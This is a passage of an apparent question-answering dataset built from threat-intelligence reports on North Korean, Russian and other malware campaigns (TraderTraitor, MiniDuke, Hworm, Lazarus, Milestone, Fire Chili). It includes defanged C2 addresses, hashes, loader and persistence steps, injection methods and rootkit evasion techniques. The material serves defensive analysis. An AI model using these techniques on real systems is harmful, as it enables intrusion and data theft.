payloads include updated macOS and Windows variants of Manuscrypt, a custom remote access trojan (RAT), that collects system information and has the ability to execute arbitrary commands and download additional payloads (see North Korean Remote Access Tool: COPPERHEDGE). Post-compromise activity is tailored specifically to the victim's environment and at times has been completed within a week of the initial intrusion.\nSmall Headline: TokenAIS\nTokenAIS purports to help \"build a portfolio of AI-based trading\" for cryptocurrencies. Mach-O binaries packaged within the Electron application contained an Apple digital signature issued for the Apple Developer Team RN4BTXA4SA. The certificate associated with Apple Developer Team RN4BTXA4SA has been revoked. The application requires users to \"register\" an account by entering an email address and a password to use its features. The malicious TraderTraitor code is a Node.js function called UpdateCheckSync() located in a file named , which is bundled in a file called , which is in an archive called app.asar. This function passes the email address that the user provided and the system platform to the C2 server, decrypts the response using AES 256 in CBC mode with the hardcoded initialization vector (IV) !@34QWer%^78TYui and a key provided in the response, then writes the decrypted data to a file and executes it in a new shell.\nSmall Headline: CryptAIS\nCryptAIS uses the same language as TokenAIS to advertise that it \"helps build a portfolio of AI-based trading.\" It is distributed as an Apple Disk Image (DMG) file that is digitally signed by an Apple digital signature issued for the Apple Developer Team CMHD64V5R8. The certificate associated with Apple Developer Team CMHD64V5R8 has been revoked. The application requires users to \"register\" an account by entering an email address and a password to use its features. The malicious TraderTraitor code is a Node.js function called UpdateCheckSync() located in a file named , which is bundled in a file called , which is in an archive called app.asar. This function passes the email address that the user provided and the system platform to the C2 server, decrypts the response using AES 256 in CTR mode and a key provided in the response, then writes the decrypted data to a file and executes it in a new shell.\nSmall Headline: AlticGO\nAlticGO was observed packaged as Nullsoft Scriptable Install System (NSIS) Windows executables that extracted an Electron application packaged for Windows. These executables contain a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named , which is bundled in , which is in the app.asar archive. The function calls an external function located in a file  bundled in  to make an HTTP request to hxxps://www.alticgo[.]com/update/. One AlticGO sample, e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703ad, instead contacts hxxps://www.esilet[.]com/update/ (see below for more information about Esilet). Some image resources bundled with the application included the CreAI Deck logo (see below for more information about CreAI Deck). The response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, there is no mechanism to decrypt a payload.\nSmall Headline: Esilet\nEsilet claims to offer live cryptocurrency prices and price predictions. It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named , which is bundled in , which is in the app.asar archive. The function calls an external function located in a file  bundled in to make an HTTP request to hxxps://www.esilet[.]com/update/. The response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, there is no mechanism to decrypt a payload. Esilet has been observed delivering payloads of at least two different macOS variants of Manuscrypt, 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efa and dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156.\n\nWhat is the role of the Esilet variant in the TraderTraitor malware campaign, and how does it deliver its payloads compared to other variants?",
    "output": "A: Esilet is a variant of the TraderTraitor malware that claims to offer live cryptocurrency prices and price predictions. It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync(), located in a file bundled in the app.asar archive. This function makes an HTTP request to hxxps://www.esilet[.]com/update/, and the response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, Esilet does not have a mechanism to decrypt a payload. It has been observed delivering payloads of at least two different macOS variants of Manuscrypt, which are custom remote access trojans (RATs) that collect system information and have the ability to execute arbitrary commands and download additional payloads.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2013: MiniDuke flies too close to the sun\nOn the 12th of February 2013, FireEye published a blogpostalerting readers to a combination of new Adobe Reader 0-day vulnerabilities, CVE-2013-0640 and CVE-2013-0641, that were being actively exploited in the wild. 8 days after FireEye's initial alert, Kaspersky spotted the same exploit being used to spread an entirely different malware family from the one mentioned in the original report. On 27th February, Kaspersky and CrySySLab published research on this previously unidentified malware family, dubbing it MiniDuke.\nAs we now know, by February 2013 the Dukes group had been operating MiniDuke and other toolsets for at least 4 and a half years. Their malware had not stayed undetected for those 4 and a half years. In fact, in 2009 a PinchDuke sample had been included in the malware set used by the AV-Test security product testing organization to perform anti-virus product comparison reviews. Until 2013 however, earlier Duke toolsets had not been put in a proper context. That finally started to change in 2013.\nThe MiniDuke samples that were spread using these exploits were compiled on the 20th of February, after the exploit was already publicly known. One might argue that since this took place after the exploits were publicly mentioned, the Dukes simply copied them. We however do not believe so. As mentioned by Kaspersky, even though the exploits used for these MiniDuke campaigns were near-identical to those described by FireEye, there were nevertheless small differences. Of these, the crucial one is the presence of PDB strings in the MiniDuke exploits. These strings, which are generated by the compiler when using specific compilation settings, means that the components of the exploits used with MiniDuke had to have been compiled independently from those described by FireEye.\nWe do not know whether the Dukes compiled the components themselves or whether someone else compiled the components before handing them to the group. This does however still rule out the possibility that the Dukes simply obtained copies of the exploit binaries described by FireEye and repurposed them.\nIn our opinion, this insistence on using exploits that are already under heightened scrutiny suggests the existence of at least one of three circumstances. Firstly, the Dukes may have been confident enough in their own abilities (and in the slowness of their opponents to react to new threats) that they did not care if their targets may already be on the lookout for anyone exploiting these vulnerabilities. Secondly, the value the Dukes intended to gain from these MiniDuke campaigns may have been so great that they deemed it worth the risk of getting noticed. Or thirdly, the Dukes may have invested so much into these campaigns that by the time FireEye published their alert, the Dukes felt they could not afford to halt the campaigns.\nWe believe all three circumstances to have coexisted at least to some extent. As will become evident in this report, this was not a one-off case but a recurring theme with the Dukes, in that they would rather continue with their operations as planned than retreat from operating under the spotlight.\nIMAGE 4: ONIONDUKE-TROJANIZED TORRENT FILE\nExample of a torrent file containing an executable trojanized with the OnionDuke toolset\nAs originally detailed in Kaspersky's whitepaper, the MiniDuke campaigns from February 2013 employed spear-phishing emails with malicious PDF file attachments. These PDFs would attempt to silently infect the recipient with MiniDuke, while distracting them by displaying a decoy document. The headings of these documents included \"Ukraine's NATO Membership Action Plan (MAP) Debates\", \"The Informal Asia-Europe Meeting (ASEM) Seminar on Human Rights\", and \"Ukraine's Search for a Regional Foreign Policy\" ((<>)image 3, page 8). The targets of these campaigns, according to Kaspersky, were located variously in Belgium, Hungary, Luxembourg and Spain.\nKaspersky goes on to state that by obtaining log files from the MiniDuke command and control servers, they were able to identify high-profile victims from Ukraine, Belgium, Portugal, Romania, the Czech Republic, Ireland, the United States and Hungary.\n2013: The curious case of OnionDuke\nAfter the February campaigns, MiniDuke activity appeared to quiet down, although it did not fully stop, for the rest of 2013. The Dukes group as a whole however showed no sign of slowing down. In fact, we saw yet another Duke malware toolset, OnionDuke, appear first in 2013. Like CozyDuke, OnionDuke appears to have been designed with versatility in mind, and takes a similarly modular platform approach. The OnionDuke toolset includes various modules for purposes such as password stealing, information gathering, denial of service (DoS) attacks, and even posting spam to the Russian social media network, VKontakte. The OnionDuke toolset also includes a dropper, an information stealer variant and multiple distinct versions of the core component that is responsible for interacting with the various modules.\nWhat makes OnionDuke especially curious is an infection vector it began using during the summer of 2013. To spread the toolset, the Dukes used a wrapper to combine OnionDuke with legitimate applications, created torrent files containing these trojanized applications, then uploaded them to websites hosting torrent files (image 4, above). Victims who used the torrent files to download the applications would end up getting infected with OnionDuke.\nFor most of the OnionDuke components we observed, the first versions that we are aware of were compiled during the summer of 2013, suggesting that this was a period of active development around this toolset. Critically however, the first sample of the OnionDuke dropper, which we have observed being used only with components of this toolset, was compiled on the 17th of February 2013. This is significant because it suggests that OnionDuke was under development before any part of the Duke operation became public. OnionDuke's development therefore could not have been simply a response to the outing of one of the other Duke malware, but was instead intended for use alongside the other toolsets. This indication that the Dukes planned to use an arsenal of 5 malware toolsets in parallel suggests that they were operating with both significant resources and capacity.\n2013: The Dukes and Ukraine\nIn 2013, many of the decoy documents employed by the Dukes in their campaigns were related to Ukraine; examples include a letter undersigned by the First Deputy Minister for Foreign Affairs of Ukraine, a letter from the embassy of the Netherlands in Ukraine to the Ukrainian Ministry of Foreign affairs and a document titled \"Ukraine's Search for a Regional Foreign Policy\".\nThese decoy documents however were written before the start of the November 2013 Euromaidan protests in Ukraine and the subsequent upheaval. It is therefore important to note that, contrary to what might be assumed, we have actually observed a drop instead of an increase in Ukraine-related campaigns from the Dukes following the country's political crisis.\nThis is in stark contrast to some other suspected Russian threat actors (such as Operation Pawn Storm) who appear to have increased their targeting of Ukraine following the crisis. This supports our analysis that the overarching theme in the Dukes' targeting is the collection of intelligence to support diplomatic efforts. The Dukes actively targeted Ukraine before the crisis, at a time when Russia was still weighing her options, but once Russia moved from diplomacy to direct action, Ukraine was no longer relevant to the Dukes in the same way.\nIMAGE 5: COSMICDUKE DECOY\nScreenshot of a decoy document appearing to be an order for growth hormones, which was used in a\nCosmicDuke campaign in September 2013\n2013: CosmicDuke's war on drugs\nIn a surprising turn of events, in September 2013 a CosmicDuke campaign was observed targeting Russian speakers involved in the trade of illegal and controlled substances (image 5, above).\nKaspersky Labs, who sometimes refer to CosmicDuke as 'Bot Gen Studio', speculated that \"one possibility is that 'Bot Gen Studio' is a malware platform also available as a so-called 'legal spyware' tool\"; therefore, those using CosmicDuke to target drug dealers and those targeting governments are two separate entities. We however feel it is unlikely that the CosmicDuke operators targeting drug dealers and those targeting governments could be two entirely independent entities. A shared supplier of malware would explain the overlap in tools, but it would not explain the significant overlap we have also observed in operational techniques related to command and control infrastructure. Instead, we feel the targeting of drug dealers was a new task for a subset of the Dukes group, possibly due to the drug trade's relevance to security policy issues. We also believe the tasking to have been temporary, because we have not observed any further similar targeting from the Dukes after the spring of 2014.\nQuestion: What was the significance of the decoy documents related to Ukraine used by the Dukes group in their 2013 campaigns, and how did their targeting strategy change following the political crisis in Ukraine?",
    "output": "Answer: The decoy documents related to Ukraine used by the Dukes group in their 2013 campaigns were significant because they were employed before the start of the November 2013 Euromaidan protests and the subsequent political crisis in Ukraine. Contrary to expectations, the Dukes group observed a drop in Ukraine-related campaigns following the crisis. This is in contrast to other suspected Russian threat actors who increased their targeting of Ukraine. The Dukes' strategy supports the analysis that their primary objective was the collection of intelligence to support diplomatic efforts, and once Russia moved from diplomacy to direct action, Ukraine was no longer relevant to the Dukes in the same way.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Deconstructing the Threats:\nThe investigation into this malware began while searching through (<https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/wildfire>)WildFire execution reports within (<https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/autofocus>)AutoFocus. Looking for newly submitted malicious samples with no family label, a unique mutex surfaced, \"RCSTEST\". Pivoting around the creation of this mutex, as well as other dynamic behaviors, a group of samples slowly began to emerge. The group of samples has common delivery mechanisms, lures and decoy file themes, payloads (Hworm), as well as control infrastructure.\nSamples from this attack came in the form of SFX files. The original filenames of these delivery files are related to political figures and groups in the Middle East and the Mediterranean. They include:\nMohamed Dahlan Abu Dhabi Meeting.exe\n\ufed3\ufec0\ufbff\ufea4\ufe94 \ufee3\ufee6 \u0627\ufedf\ufecc\ufbff\ufe8e\u0631 \u0627\ufedf\ufe9c\ufed8\ufbff\ufede \u0627\u0631\u062f\u0648\ufecf\ufe8e\u0646 \ufbfe\ufeb8\ufeae\u0628 \u0627\ufedf\ufea8\ufee4\ufeae\n.exe\n\ufebb\ufeae\u0627\ufecb\ufe8e\u062a \u062f\u0627\ufea7\ufee0\ufbff\ufe94 \ufed3\ufef2 \ufebb\ufed4\ufeee\u0641 \u0627\ufefb\ufea7\ufeee\u0627\u0646 \u0627\ufedf\ufee4\ufeb4\ufee0\ufee4\ufbff\ufee6\n.exe\n\ufecb\ufee4\ufee0\ufbff\ufe94 \u0627\ufecf\ufe98\ufbff\ufe8e\u0644 \u0627\ufedf\ufeaa\ufedb\ufe98\ufeee\u0631 \ufee3\ufea4\ufee4\ufeaa \ufedb\ufee4\ufe8e\u0644\n.scr\n\u0627\ufedf\ufee4\ufee0\ufeda \ufecb\ufe92\ufeaa \u0627\ufdf2 \ufbfe\ufeec\ufeaa\u062f \u062f\u0648\u0644 \u0627\ufedf\ufea8\ufee0\ufbff\ufe9e \u0648\ufbfe\ufe98\ufeee\ufecb\ufeaa \u062f\ufea3\ufefc\u0646\n.exe\n\ufe91\ufe8e\ufedf\ufed4\ufbff\ufeaa\ufbfe\ufeee \u0627\ufee3\ufbff\ufeae \ufeb3\ufecc\ufeee\u062f\u064a \ufbfe\ufeec\ufbff\ufee6 \ufee3\ufeee\u0627\ufec3\ufee8\ufbff\ufee6 \ufecb\ufee0\ufef0 \u0627\ufedf\ufeec\ufeee\u0627\u0621\n.scr\nWhen executed each SFX file opens a decoy document, video, or URL, and eventually executes an Hworm payload in the background. The decoy files are similarly themed when compared to the above delivery file names. Figure 1 shows a screenshot from a video one sample opens as a decoy.\nAnother sample displays a YouTube video by dropping a .url shortcut and opening it using the system's default web browser. Figure 2 illustrates the .url file contents:\nWhen the .url file is opened, the above YouTube video is displayed as a decoy. It is unclear at this time if the uploader of this video has any relation to this particular attack\nBesides decoys, the samples also execute Hworm payloads, all of which are packed. Each Hworm payload created a unique mutex (while some SFX files delivered the same Hworm payload). All of the samples beaconed to one of three network locations as shown in Figure 3:\nWhile prior reports on Hworm have been (<https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html>)published, we were unable to identify any report detailing this particular version of Hworm. Some previous versions would embed AutoIT scripts in resource sections of PE files while others would execute obfuscated VBS scripts. Some previous versions of the Hworm implant would embed data in the headers of HTTP requests or POST bodies as a method of command and control. Beacons of that HTTP protocol example are easily recognized by the use of '<|>' as a delimiter and the URI of the request. This new version of Hworm uses a mixed binary and ASCII protocol over TCP. Figure 4 is a packet capture of the protocol used by Hworm samples in this attack. It includes the string \"new_houdini\", the mutex used by the implant, the name of the user, the operating system version, the version of the implant, and the name of the foreground process:\nDuring the investigation of this malware a forum post on dev-point[.]com, an Arabic speaking technology and security forum, by a user with the handle \"Houdini\", outlined plans for a rewrite of a backdoor in Delphi. This post occurred around July 2015.\nAround October 2015, a password protected beta version of the builder used to create Delphi Hworm implants (a4c71f862757e3535b305a14ff9f268e6cf196b2e54b426f25fa65bf658a9242) was uploaded to VirusTotal. Unfortunately, the builder used to create the samples outlined in the above attack was not located. Unit 42 believes the samples used in the above attack are a version which were released after the beta.\nBig Headline: The VBS Loader:\nThe script contains three files encoded in base64. The first file is (<http://www.script-coding.com/dynwrapx_eng.html>)DynamicWrapperX (DCOM_DATA), the second file is the RunPE shellcode (LOADER_DATA), and the third file is the file which gets injected into host process (FILE_DATA). DynamicWrapperX provides access to all Windows APIs from a Visual Basic Script providing a wide range of functionality to this VBS script.\nThe configuration of the script is at the beginning of the file (Figure 5).\nIn the above example, the script will use the registry as a startup method, it will drop itself into the system's %appdata% directory using the filename myhworm.exe and it will inject itself into svchost.exe.\nAs the script executes it first adds one of three startup methods which will execute the script on Windows startup:\n1 Registry Run in HKCU\n2 3 Path: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n4 5 EntryData Wscript.exe //b //e:vbscript\n6 /b Specifies batch mode, which does not display alerts, scripting errors, or 7 input prompts.\n8 /e Specifies the engine that is used to run the script.\n9 Define startup directory\n10 Startup task (not implemented yet)\nFollowing the installation of persistence, the script checks if the current environment is WOW64. If so, the script will execute:\n1 %windir%\\syswow64\\wscript.exe /b /e:vbscript <filepath>\nThe script then drops DynamicWrapperX in the configured installation directory with file extension \".bin\".\n1 <installdir>\\<filename>.bin\nIt will then register DynamicWrapperX:\n1 regsvr32.exe /I /S <filename_dynamic_wrapperx>\nNext, the script will load the registered object:\n1 \"set DCOM = CreateObject(\"DYNAMICWRAPPERX\")\"\nIt registers /load VirtualAlloc and CallWindowProcW as functions which can be directly called in the script using \"dcom.VirtualAlloc <arguments>\".\nUsing VirtualAlloc it will allocate new memory and copy RunPE shellcode (LOADER_DATA, loader.hex) and the to-be-injected binary (FILE_DATA) into memory.\nUsing CallWindowProcW the script will jump to the RunPE shellcode and the shellcode will inject the file (FILE_DATA) into the host process. The host process is by default svchost.exe but for .NET files injection can occur into the file:\n1 %windir%\\Microsoft.Net\\Framework\\v2.0.50727\\msbuild.exe\nFigure 6 shows the main routine of the script:\nFigure 7shows a hex dump of LOADER_DATA (RunPE shellcode):\nSimilarities in comments and coding styles between previous versions of the Hworm VBS script and the VBS script provided in this beta builder can be seen in Figure 1. Top is the VBS file from the HTTP version of Hworm, compared with the VBS script produced by the beta builder of Hworm (below).\nBig Headline: The Beta Server:\nThe main server which the builder produces is developed in Delphi and is not encrypted. Unit 42 has seen variants packed with VMProtect and ASPack. In some versions of the Delphi Hworm implants discovered (unpacked beta versions) the settings are stored in the resource section RCData\\\"CONFIG\" and are in clear text (Figure 9).\nSome versions also have an unfinished PE spreader in the resource section (a65fd78951590833904bd27783b1032b7cc575220a12c6d6f44cb09061999af3). The spreader will terminate all running processes named \"sm?rtp.exe\" and execute a VBS file using wscript.exe:\n1 \"wscript.exe /e:vbscript <current directory>\\$RECYCLE.BIN\\u vbs name here\".\nThe server exports some unused functions (they all just have RET instruction). We have seen \"wrom.exe\" and \"server.exe\" used as the name in the export table (Figure 11).\nThe author used the open source library Indy Components for network communication. They also used BTMemoryModule to load DLLs from memory (without saving it on the disc).\nThe Hworm implants use a connect-back communication. This means the server (implant) connects back to the client (remotely controlling system). It also has some modules implemented in the server and each module uses its own socket for communication (on the same port defined in the configuration).\nThe following modules provide features of this malware:\nScreenshot: Provides the ability to capture screenshots in JPEG/BMP formats\nKeylogger: Provides the ability to log key strokes\nInternet IO: Provides the ability to download and execute files from the internet. It also provides the ability to load the executables via the RunPE technique\nFile Manager: Provides the ability to list files and directories, delete, rename, and execute files, and upload or download files via TCP or HTTP\nPassword: Provides the ability to steal passwords from Firefox, Opera, and Chrome browsers\nMisc: Provides the ability to list processes or modules and kill running processes\nUSB Notifier: Provides the ability to notify the controller when a USB device is attached\nHoudini Client: Provides the main client, which contains the server's configuration.\nBig Headline: Final Thoughts:\nThe similarities in coding styles and features of the server, as well as languages and handles used by the author of\nthe malware, lead us to believe the beta builder is a version of Hworm which was created somewhere between the HTTP version and the version used in the above outlined attack.\nAs this RAT can be found online in semi-public locations it is possible the malware is used by both surgical threat actors as well as within casual compromises. The above attack is only one such campaign Unit 42 has discovered using the Delphi versions of Hworm.\nPalo Alto Networks customers can use AutoFocus to find all versions of Hworm samples using the \"Hworm\" tag.\nRead the text above and answer this question: What are the main features and modules of the Hworm implant, and how does it communicate with its controller?",
    "output": "The Hworm implant includes several modules that provide various functionalities: Screenshot (captures screenshots), Keylogger (logs keystrokes), Internet IO (downloads and executes files, loads executables via RunPE), File Manager (lists, deletes, renames, executes files, uploads/downloads files via TCP or HTTP), Password (steals passwords from browsers), Misc (lists processes or modules, kills processes), USB Notifier (notifies when a USB device is attached), and Houdini Client (contains the server's configuration). The implant uses a connect-back communication method, where the server (implant) connects back to the client (remotely controlling system), with each module using its own socket for communication on the same port defined in the configuration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Lazarus attack group attack case using public certificate software vulnerability widely used by public institutions and universities\nnuno\nFeb 2023, 2\nSince last year (March 2021), the Lazarus attack group's malware has been found in a number of domestic companies such as defense, satellite, software, and media companies, and the AhnLab Security Emergency Response Center (ASEC) has been continuously tracking and analyzing the activities of the Lazarus attack group and related malware.\nThe affected customer in this case had already been breached once by the Lazarus attack group in May 2022, and the breach recurred due to a 5-day vulnerability in the same software. At the time of the May 0 breach, the customer was using a weak version of the certificate-related program widely used in public institutions and universities, and all the software was updated to the latest version after the accident. This time, however, it was breached by a 2022-day vulnerability in the software.\nASEC has reported the software to KISA, but the vulnerability has not been clearly identified, and the manufacturer and software are not disclosed in this article because no software patch has been released yet.\nIn addition to this incident, the Lazarus Group is continuously researching various software vulnerabilities to infiltrate domestic institutions and companies, and is continuously changing TTP by disabling security products, and using anti-forensic technologies to hinder and delay detection and analysis.\nThis report is based on the victim's forensic analysis report. The report was prepared in January, but after delaying disclosure due to software vulnerability patching issues, the company decided to release the software information after anonymizing it. When a software patch is released, we will redistribute a report of the version that released the information.\nMedium Headline: Lessons from examples\nThe attackers took advantage of a 0-Day vulnerability in the public certificate software widely used in the country. This type of software does not update automatically, so be sure to patch the latest version of your software and uninstall it if you are not using it.\nThe attackers defeated the security product using a technique called BYOVD, which exploits a vulnerable driver kernel module.\nThe attackers performed anti-forensic acts, such as changing and deleting files to conceal malicious behavior, or manipulating time information.\nThe victim was re-breached by the same attacker in a similar way. In addition to reactive measures, continuous monitoring must prevent the threat from recurring.\nMedium Headline: PC01 Analysis\nPC01 is believed to have been compromised by a 2022-Day vulnerability attack in certificate software on 11/18/10 00:35:0. Three network connection attempts were made from PC02 to the service TCP port of PC01's certificate software. In the previous two connections, there was no special response from PC01, but when PC02 accessed PC11 at 18:10 on 00/01 using skypeserver.exe (unsecured) created using svchost.exe, PC01 encountered an error (AppCrash) in the certificate software, and malicious actions began thereafter. When AppCrash occurred, all error reports (WARs) and memory dump files stored in the system were deleted and could not be checked. It appears to have been intentionally deleted by the attackers.\n[Table] History of access from PC02 to certificate software service port of PC01 (V3 behavior log)\n[Figure] Record of Crashdump File Generation in Certificate Software\nAmong the traces identified in PC01, the difference from the attack that occurred in May is that the process used after the vulnerability attack in the certificate software was svchost.exe rather than ftp .exe, and the vulnerable version of the software was installed at the time, but this time all the latest versions were installed, so there is no known vulnerability information.\n[table] Certificate software versions installed on PC01 and PC02\nAfter accessing PC01, the attacker injected a malicious thread into a normal process (svchost.exe) and used it for C2 communication and backdoor. It then neutralized the V3 product installed on the system, and created and executed additional malicious files.\nIn addition, in this analysis, traces of manipulation of the timestamp of malicious files were confirmed, and anti-forensic behaviors such as randomly changing and deleting file names when deleting files were found, so it seems that attackers are actively interfering with the analysis.\nMedium Headline: PC02 Analysis\nThe attacker was found to have accessed PC10 by exploiting a vulnerability in the certificate software on 21/10 48:48:02. AppCrash occurred during the attack of the vulnerability, after which the ftp .exe was executed and malicious behavior began. This is the same method that occurred in the affected customer in May. The IP of the system that accessed PC5 has not been determined.\n[Picture] Certificate Software Error Log Verified on PC02 (Application.evtx)\n[Picture] Certificate software found in V02 MDP log on PC3 and malicious thread injection code in ftp .exe\nAfter first infiltrating PC10 on 21/02, the attacker created a malicious file that performed C2 server communication and backdoor functions through an injected ftp .exe.\nOn 10/27, unlike the attack on the 21st, instead of ftp.exe, it injected a malicious thread into the SVChost.exe process, after which it carried out malicious actions with control until 11/18.\nOn 11/15, it was confirmed that an FSWss file .exe was created to scan the internal network. After that, it was confirmed that he used svchost.exe to connect to the service port of PC01's certificate software twice.\nOn 11/18, a skypeserver.exe file was created and the file was used to access PC01's TCP XXXXX, and at this time, an AppCrash of the certificate software occurred on PC01, and then PC02 confirmed traces of disabling antivirus, creating and executing malicious files, etc., the same as PC01.\nMedium Headline: Disabling V3 by BYOVD\nIn the PC01 and PC02 systems, an attempt to disable V11 was detected (Exploit/Win.Lazardoor.GEN) at 18/10 20:28:11 and 05:45:3, respectively, and the period after which V3 was disabled is as follows:\nPC01: 11/18 10:20:28 ~ 11/18 11:25:00 (about 1 hour)\nPC02: 11/18 11:05:45 ~ 11/21 14:07:08 (about 75 hours)\nDuring this period, V3-related processes are running, but normal behavior detection is not possible. However, after the system reboots, V3 returns to normal.\n[Picture] V01 Neutralization Detection Log Seen on PC3\nAttackers need access to kernel memory to manipulate kernel memory on Windows systems to disrupt the operation of security products, and in May, Taiwanese component manufacturer ENE Technology's ene.sys was used in a BYOVD attack.\nAt the time of detection of V01 incapacitation of PC02 and PC3, no trace of the attack method was found. Rather, a vulnerable driver file was created on the system after the V3 outbreak, which is the driver file of Procexp152 of ProcessExplorer, a process management utility provided .SYS free of charge by Microsoft, and is a vulnerable driver that can be used for BYOVD attacks. However, this driver file was created after V01 defeat on both PC02 and PC3, and was used by the perlcritic.exe (unsecured) file generated by the attacker.\nIn other words, the order of V3 defeat occurrence time and driver file creation time does not match, so it is a BYOVD attack, PROCEXP152. It is not yet possible to say whether SYS was used to neutralize V3.\nThe method that occurred in May and the method that occurred in November have the following differences.\n[Table] Comparison of traces related to V5 incapacitation in May and November\n\nBased on the above text, answer a question. What techniques did the Lazarus attack group use to evade detection and analysis during their attacks on PC01 and PC02?",
    "output": "The Lazarus attack group used several techniques to evade detection and analysis during their attacks on PC01 and PC02. These included deleting error reports and memory dump files after causing an AppCrash in the certificate software, injecting malicious threads into normal processes like svchost.exe for C2 communication and backdoor activities, neutralizing the V3 product installed on the system, and performing anti-forensic behaviors such as manipulating timestamps of malicious files and randomly changing and deleting file names.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Chain of Attack\nWhile examining customer alerts and telemetry, we noticed several infiltrations into victim networks that were achieved via a Log4Shell exploitation of vulnerable VMware Horizon servers. These attacks spawned a new PowerShell process to download and execute a chain of scripts that ended with the installation of a malicious DLL.\nThe encoded PowerShell command downloads another PowerShell script from a remote server and executes it.\nThe next stage PowerShell script downloads three additional files from the same server: 1.bat, syn.exe and 1.dll.\nThe script then executes 1.bat, which in turn executes syn.exe and proceeds to delete all three files from the disk.\nFigure 4: Content of 1.bat script downloaded from the server syn.exe is a program that loads its first command-line argument using LoadLibrary, in this case, 1.dll. The 1.dll module is the final payload, a backdoor that we have dubbed Milestone. Its code is based on the leaked source code of /Netbot Attacker and is packed with Themida.\nThe backdoor copies itself to %APPDATA%\\newdev.dll and creates a service named msupdate2 by creating the service entry directly in the registry. Several other service names and descriptions have been observed among different samples.\nWhile it has the same name as the legitimate Microsoft newdev.dll, it has only two of the real newdev.dll's exports plus an additional ServiceMain export.\nOverall, the backdoor has capabilities similar to Gh0st RAT's, with notable differences. Its C2 communication is uncompressed, unlike Gh0st RAT communication which is zlib-compressed. There are differences in commands as well. For example, in the CMD command, some variants first copy cmd.exe to dllhost.exe to avoid detection by security products that monitor CMD executions. Additionally, the backdoor supports a command that sends information about the current sessions on the system to the server. This command does not exist in the original Gh0st RAT source code.\nAmong the many backdoor samples we hunted down, there are two distinguishable versions: binaries compiled in 2016 contain the version string MileStone2016, while those compiled in 2017 contain MileStone2017. The samples used in the recent infections we detected are only the 2017 variants.\nThere are several differences between the 2016 and 2017 Milestones. First, 2017 Milestones are typically packed with Themida, while 2016 ones are unpacked. Secondly, although 2016 Milestones have plausible timestamps, all 2017 Milestones share an identical timestamp, which leads us to believe they are forged. Combined with the fact that 2017 backdoors are used in attacks to this day, it is uncertain whether they were compiled in 2017 or much later.\nThe two versions also slightly differ in commands and communication. 2016 Milestones apply XOR encryption to their communication, as well as support a command to execute as a new user with administrator privileges. To do so, the backdoor first creates a new administrator user on the system, with the username ANONYMOUS and the password MileSt0ne2@16. It then executes another instance of itself as that user with CreateProcessAsUser and proceeds to remove the user from the system immediately thereafter.\nBig Headline: A Stone's Throw Away\nIn addition to the backdoors, we obtained a third type of sample \u2013 a dropper. It writes three files to the disk:\nBenign executable \u2013 %APPDATA%\\syn.exe\nMilestone loader \u2013 %APPDATA%\\newdev.dll\nDriver \u2013 C:\\Windows\\system32\\drivers\\crtsys.sys\nThe payloads above are stored XOR-encrypted and LZMA-compressed. The XOR key is a hardcoded DWORD that changes between samples.\nThe dropper carries two builds of the driver for 32-bit and 64-bit systems. Using the Service Control Manager (SCM) API, it installs the build compliant with the operating system architecture as a driver named FSFilter-Min.\nThe dropper patches the .data section of the loader binary to add its configuration before it writes it to disk. Next, the dropper executes syn.exe, a benign executable signed by Synaptics, in order to side-load the newdev.dll loader module.\nThe loader also contains a XOR-encrypted and LZMA-compressed payload, which is a Milestone backdoor. It decrypts the configuration with XOR 0xCC  and, like the dropper, patches the backdoor's .data section with it. The configuration contains the backdoor's version, C2 server address and service parameters.\nFinally, the loader reflectively loads the Milestone backdoor and calls its exports.\nBig Headline: Fire Chili Rootkit\nAs part of our research, we have collected four driver samples \u2014 two pairs of 32-bit and 64-bit samples. One pair was compiled in early August 2017 and the second pair was compiled ten days later. All four driver samples are digitally signed with stolen certificates from game development companies, either the US-based Frostburn Studios or the Korean 433CCR Company (433\uc528\uc528\uc54c \uc8fc\uc2dd\ud68c\uc0ac). The signatures made with Frostburn Studios' certificate are even timestamped.\nTwo of the samples are on VirusTotal and have a very low detection rate.\nThe rootkit starts by ensuring the victim machine is not running in safe mode. It then checks the operating system version. The rootkit uses Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects, for its operations. For this reason, it relies on specific OS builds as otherwise it may cause the infected machine to crash. In general, the latest supported build is Windows 10 Creators Update (Redstone 2), released in April 2017.\nThe purpose of the driver is to hide and protect malicious artifacts from user-mode components. This includes four aspects: files, processes, registry keys and network connections. The driver has four global lists, one for each aspect, that contain the artifacts to hide. The driver's IOCTLs allow dynamic configuration of the lists through its control device \\Device\\crtsys. As such, the dropper uses these IOCTLs to hide the driver's registry key, the loader and backdoor files, and the loader process.\nMedium Headline: Files\nThe rootkit implements a filesystem minifilter using code based on Microsoft's official driver code samples. Prior to registering the minifilter instance, it dynamically creates an instance in the registry named Sfdev32TopInstance with altitude 483601.\nThe rootkit sets only one callback for a postoperation routine for IRP_MJ_DIRECTORY_CONTROL. When it receives an IRP with a minor function of IRP_MN_QUERY_DIRECTORY and a filename from the global file list, the callback changes the filename to \".\" and the filename length to 0 (in the FILE_BOTH_DIR_INFORMATION structure).\nThe global file list is initialized with the path of the driver by default (*\\SYSTEM32\\DRIVERS\\CRTSYS.SYS).\nMedium Headline: Processes\nThere are two mechanisms pertaining to processes:\nPreventing process termination.\nHiding a process.\nTo prevent the termination of a process, the rootkit denies the PROCESS_TERMINATE access right of the processes it protects. Using ObRegisterCallbacks, it registers a preoperation callback routine 